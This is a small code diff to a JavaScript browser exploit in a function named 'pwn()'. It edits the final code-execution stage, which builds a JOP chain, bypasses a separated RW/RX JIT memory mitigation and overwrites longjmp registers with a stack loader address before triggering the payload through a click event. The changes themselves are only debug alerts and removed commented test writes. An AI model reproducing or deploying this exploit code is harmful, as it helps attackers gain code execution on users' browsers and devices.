@@ -740,6 +740,7 @@ function pwn() {
 
 
     //6. We've done here, get code execution
+    alert("Building JOP chain, executing stages payload!");
     log(`[Stage 6] Prepare code execution...`);
     
     // needed to bypass seperated RW, RX JIT mitigation
@@ -1063,15 +1064,9 @@ function pwn() {
     }
 
     //set longjmp's register
-    // write64(Add(x19, 0x40), new Int64(0x4141414141414140));
-    // write64(Add(x19, 0x48), new Int64(0x4141414141414144));
-    // write64(Add(x19, 0x50), new Int64(0x4141414141414148));
-
     var sp = Add(stack, (arrsz - off) * 4);
     write64(Add(x19, 0x58), new Int64(stackloader));
     write64(Add(x19, 0x60), new Int64(sp));
-
-    // alert("Done building JOP chain, executing stages payload!");
 
     wrapper.addEventListener("click", function(){ }); 
 
